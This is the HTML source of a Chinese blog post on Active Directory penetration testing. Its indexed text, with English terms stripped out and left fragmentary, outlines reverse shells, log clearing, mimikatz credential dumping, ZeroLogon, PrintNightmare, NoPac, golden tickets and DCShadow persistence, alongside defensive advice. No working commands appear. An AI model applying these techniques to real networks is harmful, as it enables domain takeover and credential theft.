<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>ADAPT域渗透测试 | 高木のBlog</title><meta name="keywords" content="操作系统,横向移动,认证机制,kerberos,NTLM,域渗透测试"><meta name="author" content="Takake"><meta name="copyright" content="Takake"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="ADAPT域渗透测试"><meta name="application-name" content="ADAPT域渗透测试"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="ADAPT域渗透测试"><meta property="og:url" content="https://blog.takake.com/posts/61927/index.html"><meta property="og:site_name" content="高木のBlog"><meta property="og:description" content="在渗透测试红队中，PowerShell 是一个强大的工具，因其深度集成于 Windows 系统且灵活性高，常用于信息收集、权限提升、横向移动和持久化攻击。以下是 PowerShell 的基础知识和红队常用技巧：  一、红队PowerShell1. PowerShell 基础基本概念 **PowerS"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/80cb39dbb6fd526671943aeea318972bd5073688.png?x-oss-process=style/img-to-webp"><meta property="article:author" content="Takake"><meta property="article:tag" content="技术,OpenAI,网络安全,hacker,ChatGPT,人工智能,WEB渗透测试,黑客,分享,服务器,WEB安全,红队,蓝队,"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/80cb39dbb6fd526671943aeea318972bd5073688.png?x-oss-process=style/img-to-webp"><meta name="description" content="在渗透测试红队中，PowerShell 是一个强大的工具，因其深度集成于 Windows 系统且灵活性高，常用于信息收集、权限提升、横向移动和持久化攻击。以下是 PowerShell 的基础知识和红队常用技巧：  一、红队PowerShell1. PowerShell 基础基本概念 **PowerS"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://blog.takake.com/posts/61927/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/css/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"GPT-4.0-turbo","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3GpafT7n8yHKUbXT","LingQueMonitorID":"3GpatLJgdLFKhspS"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: 'https://takake.netlify.app/.netlify/functions/twikoo',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: {"mode":null,"api":null,"cover_change":true},
  authorStatus: {"skills":["🤖️ 人工智能爱好者","🔍 分享与热心帮助","🔨 删库跑路一条龙","🤝 网络安全从业者","🏃 脚踏实地行动派","🧱 团队小组发动机"]},
  algolia: {"appId":"6ECK9ICH9Y","apiKey":"4d7d6edad6ebd6c982ea423b6b573b1c","indexName":"my_hexo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Takake","link":"链接: ","source":"来源: 高木のBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: true,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '高木のBlog',
  title: 'ADAPT域渗透测试',
  postAI: '本篇文章接介绍了域渗透测试中的常见技术和工具利用。',
  pageFillDescription: '一、红队PowerShell, 1. PowerShell 基础, 基本概念, 常用命令, 2. 红队常用 PowerShell 模块, 信息收集, 权限提升, 横向移动, 持久化, 3. 绕过安全检测, 混淆与编码, 无文件攻击, 4. 防御规避, 5. 实战工具推荐, 6. 防御建议, 7. 示例：反向 Shell, 二、AD域基础知识, Active Directory (AD) 域基础知识, 1. AD 核心概念, 1.1 域（Domain）, 1.2 林（Forest）与树（Tree）, 1.3 组织单位（OU Organizational Unit）, 1.4 关键角色（FSMO Roles）, 2. AD 核心服务, 2.1 DNS, 2.2 LDAP（轻量级目录访问协议）, 2.3 Kerberos 认证, 3. AD 安全机制, 3.1.安全边界, 3.2 权限模型, 3.3 组策略安全, 4. 红队视角：AD 常见攻击面, 4.1 信息收集, 4.2 凭证攻击, 4.3 横向移动, 4.4 权限提升, 4.5 持久化, 5. 常用工具, 6. 防御建议, 示例：通过 LDAP 查询域信息, 三、活动目录枚举, 1. 基本信息枚举, (1) 获取当前域信息, (2) 域控制器定位, 2. 用户与组枚举, (1) 查询域用户, (2) 查询域组, 3. 计算机枚举, (1) 列出域内计算机, (2) 定位特定服务主机, 4. 组策略（GPO）枚举, (1) 列出所有 GPO, (2) 查找敏感配置, 5. 信任关系与林信息, (1) 域信任关系, (2) 林信息, 6. 工具化枚举, (1) PowerView（PowerShell 脚本）, (2) BloodHound（可视化分析）, 7. 隐蔽枚举技巧, (1) LDAP 匿名查询, (2) 绕过日志监控, 8. 关键信息示例, (1) 定位域管理员, (2) 查找敏感共享, 防御建议, 四、本地权限提升, 1. 基础信息收集, 2. 常见提权手法, (1) 利用未修补的系统漏洞, (2) 服务权限滥用, (3) 计划任务提权, (4) DLL劫持（DLL Hijacking）, (5) 令牌模拟（Token Impersonation）, (6) 注册表键滥用, (7) 利用自动运行程序（Autoruns）, (8) 其他, 3. 自动化提权工具, (1) PowerUp.ps1, (2) Windows-Exploit-Suggester, (3) Metasploit, (4) 土豆家族, 1. 土豆家族概述, 核心原理, ⼟⾖系列漏洞与提权⼯具, 2. 常见工具及利用场景, (1) 主流土豆工具, (2) 利用条件, 3. 典型攻击流程, (5) Print系列漏洞与提权⼯具, 4. 防御建议, 5. 示例：利用PowerUp提权, 五.域权限提升之Bloodhound, 1. BloodHound 核心概念, (1) 数据收集, (2) 核心分析视角, 2. 域权限提升实战流程, 步骤1：新版安装配置, 步骤1：安装与配置, 步骤2：数据收集, 步骤3：关键查询与攻击路径, (1) 查找域管理员所在主机, (2) ACL 滥用提权, (3) 非特权用户到域控制器的攻击路径, (4) Kerberoasting 攻击目标, (5) 滥用 GPO 提权, 3. 实战提权案例, 案例1：通过 ACL 提权到域管理员, 案例2：利用会话劫持横向移动, 4. 防御建议, 5. 扩展工具与技巧, 六.内网渗透之mimikatz专题简介, 1. 核心功能与模块, (1) 核心能力, (2) 关键模块, 2. 典型使用场景, (1) 内网渗透, (2) Windows 高版本适配, 3. 常见攻击手法示例, (1) 提取本地用户凭据, (2) Kerberoasting 攻击, (3) DCSync 攻击（域控权限）, 4. 防御与检测, (1) 防护措施, (2) 检测建议, 5. 工具联动与扩展, 6. 注意事项, 七.域权限提升漏洞篇, 1.MS14-068, 漏洞原理, 漏洞复现流程, 适用范围, PAC扩展知识补充, 防御与缓解措施, 工具与扩展, 2.CVE-2020-1472（ZeroLogon）, 漏洞利用条件, 漏洞利用流程, 关键技术与原理, 防御与缓解措施, 工具与资源, 3.CVE-2021-1675 (PrintNightmare), 漏洞利用条件, 漏洞利用流程, 技术原理与漏洞本质, 防御与缓解措施, 复现失败常见原因, 4.CVE-2021-42278 + CVE-2021-42287（NoPac）, 漏洞原理概述, 漏洞利用条件, 漏洞利用流程, 手动利用步骤, 自动化工具利用（以noPac为例）, 自动化工具利用(sam-the-admin), 步骤 1：漏洞检测与初始化, 步骤 2：请求伪造 TGT 票据, 步骤 3：恢复机器账户名, 步骤 4：通过 S4U2Self 请求高权限 ST, 步骤 5：执行远程命令或 DCSync, 防御与缓解措施, 工具与资源, 5.ADCS证书服务攻击（NTLM中继）, 一、漏洞原理, 二、利用条件, 三、利用流程, 1. 环境准备与检测, 2. 配置NTLM中继, 3. 触发NTLM认证, 4. 获取伪造证书, 5. 申请高权限票据, 6. 权限提升与横向移动, 四、防御与缓解措施, 五、工具与资源, 八、域权限提升-委派, 一、委派提权的核心机制, 二、委派类型与攻击面, 1. 非约束委派（Unconstrained Delegation）, 2. 约束委派（Constrained Delegation）, 3. 基于资源的约束委派（Resource-Based Constrained Delegation RBCD）, 三、攻击工具与检测, 1. 常用工具, 2. 防御与检测, 四、总结, 九、域权限维持, 1.黄金票据（Golden Ticket）, 一、黄金票据的核心原理, 二、攻击前提条件, 三、黄金票据生成与利用流程, 步骤 1：获取 krbtgt 账户的凭据, 步骤 2：生成黄金票据, 步骤 3：权限验证与利用, 四、技术原理深度解析, 2.白银票据（Silver Ticket）, 一、白银票据的核心原理, 二、攻击前提条件, 三、白银票据生成与利用流程, 步骤 1：获取服务账户的凭据, 步骤 2：生成白银票据, 步骤 3：权限验证与利用, 四、技术原理深度解析, 五、白银票据 vs. 黄金票据, 3.万能密码, 一、万能密码的核心概念, 二、技术实现方式, 1. Skeleton Key（骨架密钥）, 2. 恶意安全支持提供者（SSP）, 3. 密码筛选器后门（Password Filter DLL）, 4. 修改NTDS.dit数据库, 4.DCSync 后门, 二、攻击流程, 1. 授予DCSync权限, 2. 创建隐蔽账户（可选）, 3. 执行DCSync导出哈希, 三、权限维持与隐蔽手段, 1. ACL隐藏技术, 2. 日志绕过, 3. 定期同步与自动化, 5.DSRM, 一、DSRM 的核心作用, 二、DSRM 权限持久化原理, 三、攻击流程, 1. 获取当前 DSRM 密码, 2. 修改 DSRM 密码, 3. 启用 DSRM 登录, 4. 持久化利用, 6.AdminSDHolder与影子组, 一、AdminSDHolder的核心原理, 二、影子组的定义与作用, 三、攻击流程详解, 步骤 1：创建影子组, 步骤 2：修改AdminSDHolder的ACL, 步骤 3：触发SDProp同步, 步骤 4：通过影子组行使特权, 四、技术原理深度解析, 十、交叉信任攻击, 一、交叉信任攻击的核心原理, 二、攻击前提条件, 三、攻击流程与手法, 1. 提取信任密钥, 2. 伪造跨域黄金票据, 3. 跨域资源访问, 4. SID History 注入（跨域提权）, 步骤1：获取源域控制权, 步骤2：确定目标域高权限SID, 步骤3：注入SID History, 步骤4：跨域访问与提权, 四、信任类型与攻击影响, 十一、森林权限持久化DCShadow, 一、DCShadow攻击原理, 二、攻击流程, 1. 环境准备, 2. 注册恶意域控制器, 3. 篡改AD对象, 4. 触发复制与清理, 三、技术优势与隐蔽性, 四、攻击场景示例, 场景1：隐蔽提权, 场景2：ACL后门, 五、检测与防御, 1. 检测方法, 2. 防御措施, 六、清除后门, 七、总结, 十二、其他补充知识点, 一.利用协议降级进行NTLM嗅探, 1. 攻击原理：名称解析协议的弱点, (1) 名称解析协议降级, (2) 本地链路多播（Link-Local Multicast）, 2. 攻击流程, 步骤1：诱骗客户端发起认证, 步骤2：触发NTLM认证, 步骤3：捕获NTLM哈希, 3. 常用工具, 4. 攻击示例（Responder 捕获NTLMv2哈希）, 5. 防御方案, (1) 禁用不安全的协议, (2) 强制使用DNS安全扩展, (3) 阻止NTLM协议滥用, (4) 网络监控与隔离, (5) 用户教育与策略, 6. 扩展：中继攻击（Relay）防御, 总结在渗透测试红队中是一个强大的工具因其深度集成于系统且灵活性高常用于信息收集权限提升横向移动和持久化攻击以下是的基础知识和红队常用技巧一红队基础基本概念基于的脚本语言和命令行工具支持自动化任务和系统管理内置命令如脚本文件扩展名为可通过命令行执行执行策略控制脚本运行权限默认限制严格常用命令执行脚本绕过执行策略远程下载并执行红队常用模块信息收集系统信息网络探测域环境信息需模块权限提升利用服务权限窃取需管理员权限横向移动替代远程执行持久化计划任务注册表启动项绕过安全检测混淆与编码编码命令代码混淆工具混淆脚本以绕过杀软签名检测针对反恶意软件扫描接口的绕过无文件攻击内存加载反射注入使用防御规避禁用日志记录清除事件日志绕过实战工具推荐渗透测试框架信息收集权限提升持久化专为红队设计的脚本集反向键盘记录框架支持后门集成攻击链防御建议限制执行策略如启用日志记录脚本块日志模块日志监控敏感命令如使用或限制脚本执行示例反向掌握基础后可结合工具和实战场景深入探索其在红队中的灵活应用注意合法授权和道德规范二域基础知识域基础知识是微软开发的目录服务用于管理网络环境中的用户计算机组和其他资源域是企业网络的核心理解其基础架构是渗透测试和红队行动的关键核心概念域定义逻辑安全边界包含用户计算机组等对象共享同一套安全策略和数据库域控制器存储数据库的服务器负责用户认证和策略执行一个域可以有多个通过复制同步数据域用户与计算机用户账号唯一标识如计算机账号每台加入域的计算机自动创建林与树林多个域的集合共享全局编录和架构根域林中第一个创建的域信任关系林内域默认双向信任林间需手动配置树具有连续命名空间的域如和组织单位作用用于逻辑分组管理对象用户计算机等可嵌套组策略通过向内的对象下发策略如密码策略软件安装关键角色中有个灵活单主机操作角色管理架构管理域的增加删除时间同步密码策略主控分配安全标识符中的维护跨域对象引用核心服务作用解析域名与依赖定位域控制器和服务记录记录域控制器的服务如轻量级目录访问协议端口默认明文和功能查询和修改对象如用户组基本结构认证流程用户向请求使用请求服务票据服务票据用于访问资源如文件服务器关键漏洞黄金票据伪造需域管理员哈希白银票据伪造服务票据需服务账号哈希安全机制安全边界域不是安全边界安全边界只有林因为可以通过中设置进行跨域通过进行域间凭证转义权限模型访问控制列表控制对象访问权限如用户能否修改组策略权限委派将管理权限下放给非管理员用户如重置密码组策略安全继承子继承父策略可强制覆盖常见风险配置不当导致普通用户获得管理员权限通过部署恶意脚本如开机启动红队视角常见攻击面信息收集枚举域用户与计算机查询域信任关系凭证攻击使用用户哈希横向移动破解服务账号的票据扫描横向移动远程执行攻击模拟域控制器同步用户哈希需权限权限提升滥用权限如修改或用户权限漏洞伪造获取管理员权限持久化生成长期有效的影子组隐藏后门用户到受信任组常用工具可视化攻击路径提取凭证操作票据执行协议级攻击如信息收集工具防御建议强化域控制器限制管理员访问启用监控日志关注异常登录事件修改最小化权限避免普通用户拥有过高权限定期审计检查配置信任关系禁用过时协议如强制使用示例通过查询域信息查询所有用户查询域管理员组掌握域基础是红队渗透测试的关键后续可结合工具和漏洞深入攻击手法注意所有操作需在授权范围内进行三活动目录枚举在渗透测试或红队行动中域基础信息枚举是获取环境关键信息的重要步骤以下是常用的枚举方法和工具涵盖用户计算机组策略信任关系等核心信息基本信息枚举获取当前域信息内置命令输出域名根域功能级别和所属林名称命令列出所有域查看当前域信息域控制器定位查询记录域名用户与组枚举查询域用户表示所有用户显示全部属性过滤管理员用户查询域组查询特权组计算机枚举列出域内计算机命令定位特定服务主机查询服务器通过组策略枚举列出所有导出设置查找敏感配置搜索密码策略检查登录脚本路径信任关系与林信息域信任关系命令林信息工具化枚举脚本下载常用命令当前域信息所有用户按过滤计算机查找共享目录可视化分析数据采集生成文件后导入界面自动分析攻击路径关键查询查找域管理员登录的主机查找具有权限提升路径的用户隐蔽枚举技巧匿名查询若允许匿名访问可直接通过查询绕过日志监控无文件执行清除内存痕迹强制垃圾回收关键信息示例定位域管理员通过日志分析查找敏感共享防御建议限制匿名查询禁用未经认证的访问监控敏感命令如启用日志记录脚本执行和模块加载定期审计权限检查特权组和配置掌握域基础信息枚举是渗透测试的关键前置步骤结合工具和手动查询可快速构建攻击地图注意所有操作需在合法授权范围内进行四本地权限提升在渗透测试或红队行动中本地权限提升是获取更高权限如或管理员的关键步骤以下是常见提权手法工具及防御建议基础信息收集在尝试提权前需先收集系统信息定位可利用的漏洞或配置缺陷查看系统版本查看当前用户权限查看安装的补丁查看计划任务查看服务权限或者使用自动化信息枚举工具豌豆常见提权手法利用未修补的系统漏洞漏洞通过打印机服务加载恶意类似的远程代码执行漏洞重置域控制器密码针对域环境利用工具漏洞模块如服务权限滥用可写服务路径查找服务二进制路径可写的服务替换二进制文件并重启服务服务未引用路径若服务路径未用引号包裹且包含空格可在中间目录植入恶意程序示例路径植入或计划任务提权查找以高权限运行的任务管理员劫持任务调用的可写脚本或劫持原理程序运行时加载未验证的路径工具监控目标进程加载的脚本自动化检测可劫持的路径令牌模拟适用场景已获取管理员进程的令牌如通过会话命令模块注册表键滥用检查是否允许普通用户以权限安装包生成恶意并安装利用自动运行程序查找开机登录自启动程序工具工具集替换可写的启动项脚本如其他在机器上本地升级权限有多种方法漏洞缺少补丁明文形式的自动部署和自动登录密码任何用户都可以以身份运行服务配置错误劫持等在环境下无法利用漏洞进行提权时积极利用不安全的配置不安全的配置很少有针对它们的补丁而且他们不是安全团队的重点针对企业应用程序部署时并未考虑到安全性例如测试系统权限过大测试账号权限过大在上许多企业应用程序需要管理特权或系统特权才能够运行可以尝试白加黑白黑自动化提权工具功能自动化检测服务计划任务注册表等提权路径使用检测所有潜在漏洞利用可写服务提权原理根据输出匹配已知漏洞使用常用模块本地漏洞检测服务权限滥用以下是关于提权土豆家族的详细介绍涵盖其原理常见工具利用条件及防御建议土豆家族土豆家族概述土豆家族是一系列利用特权或漏洞进行本地权限提升的工具和技术统称它们通过模拟高权限令牌如或滥用服务配置将低权限用户如服务账户提升至系统权限广泛用于红队渗透测试中核心原理特权滥用利用模拟令牌或分配令牌特权通过如生成高权限进程令牌窃取通过中间人攻击如重放命名管道或接口劫持系统进程如的令牌系列漏洞与提权具滥的权限描述利了中的攻击通过滥具有权限的进程来获得权限攻击者通过代理身份验证请求将身提升为当前进程更的权限通常为滥的权限或描述是对技术的改进主要在更版本的上作例如和它通过调服务来滥或同样可以将当前户提升为滥的权限或描述是对的进步改进修复了在和上的不可问题它通过建凭证的连接来获取更权限的身份继续利或滥的权限或描述是对的进步改进专针对和的它尝试通过各种对象进提权当某些端点被安全策略或补丁修复时它会动尝试其他路径滥的权限描述是的昀早版本于本地提权后来逐渐演化为更复杂的攻击技术如直接利了中的攻击并利请求来欺骗服务进提权滥的权限系列漏洞与提权具描述是种轻量级的提权具旨在通过昀少的操作来实现权限核思想仍然是滥它的实现式其他具要简单针对特定的场景做了优化滥的权限或描述是系列的另个变种主要于更级的环境提权特别是在些不适合使或的环境下使常见工具及利用场景主流土豆工具工具名称特点适用系统版本利用服务通过命名管道模拟令牌通过重放攻击模拟令牌早期经典工具依赖组件滥用需列表通杀全系的改进版支持多种协议等支持多协议令牌模拟适用于高版本系统利用加密文件系统接口获取令牌通过打印通知功能触发权限提升注部分工具需自行编译如部分自带如利用条件必要特权当前用户需具备或常见于服务账户服务依赖如需运行依赖认证机制系统补丁未安装相关漏洞补丁如典型攻击流程信息收集检查当前权限系统版本及补丁状态工具上传通过上传土豆家族如至可写目录执行提权运行工具生成高权限进程如启动反向权限维持通过或获取会话进行横向移动或持久化系列漏洞与提权具滥的权限特定情况下或者远程执需特殊权限描述是种漏洞编号为它影响了的服务允许攻击者远程执代码或者提升本地权限虽然有些场景下需要来加载恶意驱动但更多时候是权限限制的远程代码执漏洞滥的权限描述利了服务中的漏洞同样滥该具通过提权攻击者可以从低权限提升到滥的权限本地权限提升描述是个打印服务中的本地提权漏洞它允许攻击者将恶意件写系统录从实现代码执或提权此漏洞影响攻击者可以通过操控打印队列中的临时件来执恶意操作滥的权限本地权限提升远程代码执描述这是漏洞的另个变体昀初被误认为仅是本地提权漏洞但后来发现它也具有远程代码执的能攻击者可以通过服务在没有特别权限的情况下执任意代码滥的权限远程代码执描述是中的远程打印协议其实现中多次出现漏洞允许攻击者通过络发送恶意的打印请求来执任意代码该协议漏洞多次被利于横向移动或远程代码执防御建议及时打补丁修复已知漏洞如永恒之蓝最小权限原则服务账户使用低权限如限制敏感目录如的写入权限启用防止自动提升权限审计配置检查计划任务服务路径注册表键使用如监控日志事件新进程创建服务安装脚本执行示例利用提权下载并执行检测漏洞发现可写服务路径生成并替换检测到服务路径可写五域权限提升之在域环境中是一款强大的开源工具用于可视化攻击路径并识别权限提升机会它通过分析用户组访问控制列表组策略等对象的关系帮助红队快速定位提权路径以下是结合的域权限提升全流程指南核心概念数据收集的官方数据收集器或版本用于抓取对象及其关系收集类型默认收集用户组计算机会话域信任等高级收集或指定特定类型如核心分析视角高价值目标特权组敏感用户具备权限或关系的用户关键资源域控制器文件服务器服务器域权限提升实战流程步骤新版安装配置官网安装指导页面需要先安装由于国内墙的原因导致安装指令需要开启系统代理翻墙且如果使用了指令需要使用参数来继承环境变量需要安装和环境且需要配置配置镜像源步骤安装与配置安装或从下载最新版启动数据库依赖登录界面访问使用默认凭证初始化密码步骤数据收集通过收集数据下载攻击机执行数据收集默认方法域名生成文件后将其导入界面步骤关键查询与攻击路径在中使用查询或预置分析功能定位提权路径查找域管理员所在主机预置查询手动查询结果定位域管理员登录的计算机尝试横向移动或凭证窃取滥用提权场景普通用户对高权限组如有权限查询利用方法将自身添加到目标组普通用户非特权用户到域控制器的攻击路径预置查询常见路径用户对计算机有本地管理员权限计算机上有域管理员会话抓取哈希用户对有编辑权限修改下发恶意任务攻击目标查询具备的服务账号导出票据后破解滥用提权查询可编辑的利用方法通过下发计划任务或启动脚本在域内主机执行恶意代码实战提权案例案例通过提权到域管理员发现攻击路径显示用户对组有权限而组对组有权限执行提权将添加到组如果尚未加入通过组权限将加入案例利用会话劫持横向移动定位高权限会话显示域管理员登录到计算机获取控制权利用本地提权漏洞如家族获取的权限转储内存使用域管理员凭证横向移动防御建议定期审计和组权限使用的防御分析功能如移除普通用户对特权组的权限限制敏感组登录范围禁止域管理员登录非域控制器主机启用本地管理员密码解决方案防止通过本地管理员权限横向移动监控异常行为日志事件登录组添加成员目录服务变更限制委派和避免服务账号过度权限扩展工具与技巧与结合手动验证攻击路径查询用户对组的权限实时浏览对象及权限自动化攻击框架执行自动化横向移动与权限验证通过红队可高效识别环境中的脆弱环节而防御者则能借此加固权限架构六内网渗透之专题简介是红队渗透测试中不可或缺的工具由法国安全研究员开发主要用于从系统中提取敏感凭据如明文密码哈希值票据等并支持多种高级攻击手法以下是其核心功能使用场景及防御措施的全面解析核心功能与模块核心能力凭据提取通过读取进程内存获取明文密码哈希票据等令牌操作模拟高权限令牌如或域管理员实现权限提升横向移动支持传递哈希票据传递等攻击日志清除清除系统安全日志隐藏攻击痕迹关键模块提取内存中的登录凭据管理票据如黄金票据白银票据注入操作数据库导出域用户哈希提权操作启用调试权限令牌窃取与模拟获取权限典型使用场景内网渗透密码提取在已控制的主机上运行获取当前登录用户的明文密码或哈希横向移动使用传递哈希登录其他主机或通过生成黄金票据访问域资源权限维持通过导出域控哈希或注入持久化后门高版本适配绕过在中默认禁用明文密码缓存需修改注册表启用配合工具提取使用导出内存文件再通过离线分析常见攻击手法示例提取本地用户凭据提权至调试权限模拟令牌提取内存中的明文密码攻击导出服务票据使用离线破解服务账号哈希攻击域控权限导出账户哈希防御与检测防护措施启用防止内存被读取限制特权账户服务账户避免使用高权限禁用日志监控关注事件新进程登录事件操作应用白名单限制未签名程序执行如检测建议保护启用受控文件夹访问阻止未授权进程访问异常行为分析监控或的执行痕迹网络流量审计识别票据请求异常或哈希传递行为工具联动与扩展集成通过插件直接调用功能如框架使用模块加载功能自动化攻击链结合分析攻击路径利用快速提权注意事项绕过杀软通过源码修改如混淆字符串内存加载无文件执行或使用加壳实现免杀系统兼容性部分功能在高版本受限需结合其他工具如的威力在于其对安全机制的深度利用但同时也暴露了系统在凭据管理上的脆弱性红队需灵活掌握其功能而蓝队应通过加固配置与实时监控降低风险七域权限提升漏洞篇身份认证流程漏洞原理是协议中的权限提升漏洞允许普通域用户伪造特权票据获取域管理员权限其核心问题在于密钥分发中心对特权属性证书签名的验证缺陷验证绕过攻击者可构造包含伪造高权限组如域管理员组的利用对校验算法如的支持缺陷绕过密钥验证签名伪造正常需使用服务账号和的哈希签名但漏洞允许使用无密钥依赖的算法生成签名使伪造的通过验证票据注入伪造的被接受后攻击者可生成任意服务的访问票据如从而获得域控权限漏洞复现流程前提条件域控未安装补丁获取普通域用户的账号密码或及其域内存在至少一台未加固的主机复现步骤环境检测确认域控未安装补丁获取当前用户如生成伪造票据使用工具如或生成域控示例生成票据注入通过或注入内存清除现有票据注入伪造票据权限验证与利用访问域控共享目录成功访问说明提权成功使用获取域控以管理员身份执行命令适用范围受影响系统未安装桌面系统利用场景攻击者已控制域内一台普通主机并获取低权限域用户凭据域控未启用过滤或强验证机制扩展知识补充核心作用权限声明是微软对协议的扩展由生成并嵌入到中用于声明用户的组成员身份如域管理员组权限列表如等关键字段用户所属组列表用户权限签名等验证机制需由使用账号的密钥签名确保其合法性防御与缓解措施补丁修复域控安装补丁并确保所有主机更新至最新版本权限控制限制普通用户权限避免其获取本地管理员权限流量监控监控请求中的异常行为如大量请求或异常内容加固启用签名强校验如仅允许算法工具与扩展利用工具自动化攻击检测脚本通过分析流量识别伪造的签名特征漏洞利用条件目标环境要求受影响系统至版本包括安装模式的域控制器补丁状态目标域控未安装微软年月发布的补丁或未启用强制模式年月前未强制修复网络访问攻击者需能通过访问域控的端口协议默认端口攻击前提域控信息已知域控的计算机名名称和地址权限要求无需任何域内用户凭证攻击者可处于域外环境发起攻击漏洞利用流程漏洞检测使用工具如提供的验证目标域控是否存在漏洞域控计算机名域控示例若返回则漏洞存在重置域控机器账户密码利用工具如将域控机器账户的密码置空域控计算机名域控示例此操作会通过调用函数将域控的机器用户密码重置为空导致域控与域数据库的凭证不一致可能引发脱域风险导出域内哈希使用的工具利用空密码导出域控的哈希包括域管账户域名域控计算机名域控示例获取的哈希可用于后续横向移动或生成黄金票据获取域控权限通过哈希传递工具如获取交互式哈希哈希域名域控示例恢复域控原始密码为防止域控脱域需从注册表导出原始哈希并还原导出注册表文件使用解析哈希还原密码域控计算机名域控原始哈希值关键技术与原理加密缺陷模式协议使用加密时初始化向量被错误设置为全零攻击者通过多次碰撞平均次生成全零的客户端凭证绕过认证挑战响应机制攻击者可控的设置为全零结合固定导致密文碰撞概率大幅提升从降至权限提升路径密码重置通过调用将域控机器账户密码置空利用其特权导出域管哈希横向扩展获取域管权限后可进一步控制整个域环境防御与缓解措施补丁修复安装微软官方补丁并启用强制模式确保所有域控和客户端使用安全的协议网络隔离限制对域控端口的非必要访问启用签名和加密监控与检测监控异常请求如大量全零参数的认证尝试工具与资源检测工具利用脚本协议库需漏洞利用条件目标环境要求受影响系统至版本至的客户端系统尤其是域控制器补丁状态未安装微软年月及后续修复补丁等或未启用强制模式的域控环境服务状态目标主机的服务需处于运行状态默认开启攻击前提权限要求普通域用户账号或机器账号如的凭据密码或网络访问攻击者需能通过协议访问目标主机的端口并拥有一个匿名共享目录用于存放恶意文件漏洞利用流程环境检测确认服务状态使用扫描目标主机的服务是否开放目标存在输出则服务可用验证补丁状态检查目标系统是否已安装补丁例如通过命令或网络工具间接判断生成恶意使用生成反向的需与目标架构匹配攻击者监听端口配置匿名共享在攻击机如或域内主机上设置匿名共享目录存放恶意需确保共享路径可被目标访问共享目录路径执行漏洞利用使用脚本发起攻击需安装修改版库域名用户名密码目标攻击者共享目录参数说明用户名密码普通域用户或机器账号凭据